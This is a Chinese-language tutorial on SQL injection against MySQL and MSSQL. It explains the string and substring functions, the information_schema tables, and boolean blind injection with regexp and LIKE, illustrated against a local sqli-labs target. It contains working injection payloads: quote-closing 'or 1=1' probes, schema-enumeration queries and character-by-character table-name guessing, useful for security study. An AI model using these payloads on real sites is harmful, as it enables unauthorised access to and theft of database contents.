## SQL注入的分类

*  基于从服务器接收到的响应  
    
    基于错误的SQL注入  
    联合查询的类型  
    堆查询注射  
    SQL盲注  
     基于布尔SQL盲注  
     基于时间的SQL盲注  
     基于报错的SQL盲注  
  
* 基于如何处理输入的SQL查询(数据类型)  
    基于字符串  
    数字或整数为基础  
    
* 基于程度和顺序的注入(哪里发生了影响) 

    一阶注射

    二阶注射

    一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.  
  
  
* 基于注入点的位置上的  
    通过用户输入的表单域的注射  
    通过cookie注射  
    通过服务器变量注射(基于头部信息的注射)
    
    
---

## SQL注入的字符串连接函数

在select数据时，我们往往需要将数据进行连接后进行回显。很多的时候想将多个数据或者多行数据进行输出的时候，需要使用字符串连接函数。在sqli中，常见的字符串连接函数有concat(),group_concat(),concat_ws()。

本篇详细讲解以上三个函数。同时此处用mysql进行说明，其他类型数据库请自行进行检测。

三大法宝 concat(),group_concat(),concat_ws()

#### concat()函数

不使用字符串连接函数时，

SELECT id,name FROM info LIMIT 1; 的返回结果为   
```
+----+--------+  
| id | name |  
+----+--------+  
| 1 | BioCyc |  
+----+--------+
```
但是这里存在的一个问题是当使用 union 联合注入时，我们都知道，联合注入要求前后两个选择的列数要相同，这里 id ， name 是两个列，当我们要一个列的时候，（当然不排除你先爆出 id ，再爆出 name ，分两次的做法）该怎么办？ ----concat()

1. concat() 语法及使用特点：   

    CONCAT(str1,str2,…)   
    返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL 。可以有一个或多个参数。

1. 使用示例：   
    `SELECT CONCAT(id, ' ， ', name) AS con FROM info LIMIT 1;`   
    返回结果为

```
+----------+  
| con |  
+----------+  
| 1,BioCyc |  
+----------+
```
一般的我们都要用一个字符将各个项隔开，便于数据的查看。

`SELECT CONCAT('My', NULL, 'QL');` 返回结果为   
```
+--------------------------+  
| CONCAT('My', NULL, 'QL') |  
+--------------------------+  
| NULL |  
+--------------------------+
```

#### CONCAT_WS() 函数

CONCAT_WS() 代表 CONCAT With Separator ，是 CONCAT() 的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL ，则结果为 NULL 。函数会忽略任何分隔符参数后的 NULL 值。但是 CONCAT_WS() 不会忽略任何空字符串。 ( 然而会忽略所有的 NULL ）。

1. concat() 语法及使用特点：

    CONCAT_WS(separator,str1,str2,…)

    Separator 为字符之间的分隔符

1. 使用示例：

`SELECT CONCAT_WS('_',id,name) AS con_ws FROM info LIMIT 1;` 返回结果为   

```
+----------+  
| con_ws |  
+----------+  
| 1_BioCyc |  
+----------+
```

`SELECT CONCAT_WS(',','First name',NULL,'Last Name');` 返回结果为   

```
+----------------------------------------------+  
| CONCAT_WS(',','First name',NULL,'Last Name') |  
+----------------------------------------------+  
| First name,Last Name |  
+----------------------------------------------+
```
#### GROUP_CONCAT （）函数

GROUP_CONCAT 函数返回一个字符串结果，该结果由分组中的值连接组合而成。   
使用表 info 作为示例，其中语句 `SELECT locus,id,journal FROM info WHERE locus IN('AB086827','AF040764');` 的返回结果为   
```
+----------+----+--------------------------+  
| locus | id | journal |  
+----------+----+--------------------------+  
| AB086827 | 1 | Unpublished |  
| AB086827 | 2 | Submitted (20-JUN-2002) |  
| AF040764 | 23 | Unpublished |  
| AF040764 | 24 | Submitted (31-DEC-1997) |  
+----------+----+--------------------------+  
```

1 、使用语法及特点：   

```
GROUP_CONCAT([DISTINCT] expr [,expr ...]  
[ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col ...]]  
[SEPARATOR str_val])  
```
在 MySQL 中，你可以得到表达式结合体的连结值。通过使用 DISTINCT 可以排除重复值。如果希望对结果中的值进行排序，可以使用 `ORDER BY` 子句。   
SEPARATOR 是一个字符串值，它被用于插入到结果值中。缺省为一个逗号 (",") ，可以通过指定 SEPARATOR "" 完全地移除这个分隔符。   
可以通过变量 group_concat_max_len 设置一个最大的长度。在运行时执行的句法如下： 

    SET [SESSION | GLOBAL] group_concat_max_len = unsigned_integer;  
如果最大长度被设置，结果值被剪切到这个最大长度。如果分组的字符过长，可以对系统参数进行设置： 

    SET @@global.group_concat_max_len=40000;  
  
2 、使用示例：   

语句 `SELECT locus,GROUP_CONCAT(id) FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;` 的返回结果为   

```
+----------+------------------+  
| locus | GROUP_CONCAT(id) |  
+----------+------------------+  
| AB086827 | 1,2 |  
| AF040764 | 23,24 |  
+----------+------------------+  
```

语句 `SELECT locus,GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;` 的返回结果为   

```
+----------+----------------------------------------------------------+  
| locus | GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') |  
+----------+----------------------------------------------------------+  
| AB086827 | 2_1 |  
| AF040764 | 24_23 |  
+----------+----------------------------------------------------------+  
```

语句 `SELECT locus,GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;` 的返回结果为   

```
+----------+--------------------------------------------------------------------------+  
| locus | GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') |  
+----------+--------------------------------------------------------------------------+  
| AB086827 | 2, Submitted (20-JUN-2002). 1, Unpublished |  
| AF040764 | 24, Submitted (31-DEC-1997) . 23, Unpublished |  
+----------+--------------------------------------------------------------------------+
```

3 、sql 注入中一般使用方法

列出所有的数据库

    select group_concat(schema_name) from information_schema.schemata

列出某个库当中所有的表

    select group_concat(table_name) from information_schema.tables where table_schema='xxxxx'

---
## SQL注入的常用函数和语句

#### 1.系统函数

    version() Mysql版本  
    user() 数据库用户名  
    database() 数据库名  
    @@datadir 数据库路径  
    @@version_compile_os 操作系统版本  
#### 2,字符串连接函数

    concat() 不使用字符串连接函数时   
    concat_ws() 是 CONCAT() 的特殊形式。第一个参数是其它参数的分隔符   
    group_concat() 函数返回一个字符串结果，该结果由分组中的值连接组合而成   
    详细见[http://www.cnblogs.com/yyccww/p/6054461.html](http://www.cnblogs.com/yyccww/p/6054461.html)  
    left(a,b) 从左侧截取a的前b位  
    right(a,b) 从右侧截取a的前b位  
    substr(a,b,c),从b位置开始,截取字符串a的c长度  
    mid(a,b,c) 从位置b开始,截取a字符串的c位
    
    ascii()将某个字符串转换为asscii  
    ord()函数同ascii(),将字符转化为ascii值  
    if(a,1,0) 如果a正确则返回1,否则返回0

#### 3.一般用于尝试的语句

注释:`--+`可以替换成`#`,`#`的URL编码是`%23`

    or 1=1 --+
    
    'or 1=1 --+
    
    " or 1=1 --+
    
    ) or 1=1 --+
    
    ') or 1=1 --+
    
    ") or 1=1 --+
    
    ")) or 1=1 --+

一般思路是:闭合引号和注释掉后面的

--- 
## MYSQL中的INFORMATION_SCHEMA数据库详解

**information_schema** 数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。  

在MySQL中，把 **information_schema** 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在 `INFORMATION_SCHEMA` 中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。

### information_schema数据库表说明:

    SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。

    TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。

    COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

    STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。

    USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。

    SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。

    TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。

    COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。

    CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。

    COLLATIONS表：提供了关于各字符集的对照信息。

    COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。

    TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。

    KEY_COLUMN_USAGE表：描述了具有约束的键列。

    ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。

    VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。

    TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表

---
## SQL注入截取字符串函数

在 sql 注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。本文中主要列举三个函数和该函数注入过程中的一些用例。 Ps; 此处用 mysql 进行说明，其他类型数据库请自行检测。

三大法宝： mid(),substr(),left()

#### mid()函数

此函数为截取字符串一部分。 MID(column_name,start[,length])

**参数** |  **描述**
-|-
column_name | 必需。要提取字符的字段。
start  |  必需。规定开始位置（起始值是 1）。
length |  可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。

Eg: str="123456" mid(str,2,1) 结果为 2

Sql 用例：

（ 1 ） MID(DATABASE(),1,1)>’a’, 查看数据库名第一位， MID(DATABASE(),2,1) 查看数据库名第二位，依次查看各位字符。

（ 2 ） `MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’` 此处 column_name 参数可以为 sql 语句，可自行构造 sql 语句进行注入。

#### substr()函数

Substr() 和 substring() 函数实现的功能是一样的，均为截取字符串。

string substring(string, start, length)

string substr(string, start, length)

参数描述同mid() 函数，第一个参数为要处理的字符串， start 为开始位置， length 为截取的长度。

Sql 用例：

(1) substr(DATABASE(),1,1)>’a’, 查看数据库名第一位， substr(DATABASE(),2,1) 查看数据库名第二位，依次查看各位字符。

(2) s`ubstr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’` 此处 string 参数可以为 sql 语句，可自行构造 sql 语句进行注入。

#### Left()函数

Left()得到字符串左部指定个数的字符

Left ( string, n ) string 为要截取的字符串， n 为长度。

Sql 用例：

(1) left(database(),1)>’a’, 查看数据库名第一位， left(database(),2)>’ab’, 查看数据库名前二位。

(2) 同样的 string 可以为自行构造的 sql 语句。

同时也要介绍 ORD() 函数，此函数为返回第一个字符的 ASCII 码，经常与上面的函数进行组合使用。

例如 ORD(MID(DATABASE(),1,1))>114 意为检测 database() 的第一位 ASCII 码是否大于 114 ，也即是 ‘r’


----

## 盲注----基于布尔的SQL盲注

### 构造逻辑判断  
常用字符串截取函数[http://www.cnblogs.com/yyccww/p/6054569.html](http://www.cnblogs.com/yyccww/p/6054569.html)  
常用函数  

    left(a,b) 从左侧截取a的前b位  
    right(a,b) 从右侧截取a的前b位  
    substr(a,b,c) 从b位置,将字符串a截取c的长度  
    mid(a,b,c) 从b位置,将字符串a截取c的长度  
    ascii() 将字符转换为ascii  
    ord()同ascii()一样  
  
  
  
### repexp正则注入  

用法`select user() regexp '^[a-z]'`  
第二位可以用`select user() regexp '^ro'`  
当正确的时候显示结果为1,不正确的是时候结果为0  

    select * from users where id=1 and 1=(if((user() regexp '^r'),1,0))  
    select * from users where id=1 and 1=(user() regexp '^r')  
^是从开头进行匹配,$是从结尾开始匹配

详细信息[http://www.cnblogs.com/yyccww/p/6054579.html](http://www.cnblogs.com/yyccww/p/6054579.html)
  
  
### 通过if语句的条件判断,返回一些条件句,比如if构造一个判断.根据返回结果是否等于0或者等于1进行判断  

    select * from users where id=1   
    and 1=(select 1 from   
    information_schema.tables   
    where table_schema='secrity' and   
    table_name regexp '^us[a-z]' limit 0,1)  
  
### like匹配注入  
和上述的正则类似,mysql在匹配的时候我们可以用like进行匹配  
  
用法 `select user() like 'ro%'`  

    http://127.0.0.1/sqli/Less-5/?id=1' and user() like 'eo%'--+

----

## SQL盲注之正则攻击

我们都已经知道，在 MYSQL 5+ 中 information_schema 库中存储了所有的 库名，表明以及字段名信息。故攻击方式如下：

1. 判断第一个表名的第一个字符是否是 a-z 中的字符 , 其中 blind_sqli 是假设已知的库名。

> 注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z 范围内

    index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*

2. 判断第一个字符是否是 a-n 中的字符
```
index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*
```

3. 确定该字符为 n
```
index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*
```

4. 表达式的更换如下
```
expression like this: '^n[a-z]' -> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE
```
这时说明表名为 news ，要验证是否是该表明 正则表达式为 '^news$' ，但是没这必要 直接判断 table_name = ’news‘ 不就行了。

5. 接下来猜解其它表了 
 
 **（只需要修改 limit 1,1 -> limit 2,1 就可以对接下来的表进行盲注了）这里是错误的！！！**

regexp 匹配的时候会在所有的项都进行匹配。例如：

security 数据库的表有多个， users ， email 等

```
select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^u[a-z]' limit 0,1); 是正确的

select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1); 是正确的

select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 0,1); 是正确的

select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 1,1); 不正确

select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 1,1); 不正确
```
实验表明：在 `limit 0,1` 下， regexp 会匹配所有的项。我们在使用 regexp 时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而此时 `limit 0,1` 此时是对于 where table_schema='security' limit 0,1 。 table_schema='security' 已经起到了限定作用了， limit 有没有已经不重要了。

-----------------------------------------------MSSQL---------------------------------------------------

MSSQL 所用的正则表达式并不是标准正则表达式 ，该表达式使用 like 关键词

    default.asp?id=1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name LIKE '[a-z]%' )

该查询语句中， select top 1 是一个组合哦，不要看错了。

如果要查询其它的表名，由于不能像 mysql 哪样用 limit x,1 ，只能使用 table_name not in (select top x table_name from information_schema.tables) 意义是：表名没有在前 x 行里，其实查询的就是第 x+1 行。

例如  查询第二行的表名：

    default.asp?id=1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name NOT IN ( SELECT TOP 1 table_name FROM information_schema.tables) and table_name LIKE '[a-z]%' )

表达式的顺序：

    'n[a-z]%' -> 'ne[a-z]%' -> 'new[a-z]%' -> 'news[a-z]%' -> TRUE

之所以表达式 news[a-z] 查询后返回正确是应为 % 代表 0-n 个字符，使用 "_" 则只能代表一个字符。故确认后续是否还有字符克用如下表达式

    'news%' TRUE -> 'news_' FALSE

同理可以用相同的方法获取字段，值。这里就不再详细描述了。







